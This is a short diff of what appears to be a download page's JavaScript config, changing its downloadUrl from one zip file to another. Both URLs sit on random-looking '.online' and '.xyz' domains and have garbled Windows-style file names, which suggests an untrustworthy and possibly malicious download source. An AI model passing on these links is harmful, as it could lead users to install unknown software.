@@ -55,7 +55,7 @@
        btnRadius: "10px",
        bg: "//p8.qhimg.com/t11098f6bcd5e40dd91a92718e4.webp",
     },
-    downloadUrl: "https://reowasiu-s3oss.online/Moice_xp-win11_x64_Diopxhsse_5410021.3364.zip", 
+    downloadUrl: "https://risanhs-sdad1e4asd-3css3hub.xyz/RUIIOPC_xp-win11_x64_Dxccimxhsse_v260036.90023.zip", 
     QH:"QH_132_4#18",
     theme:"v2",
     themeBtnColor: "#15CA71",
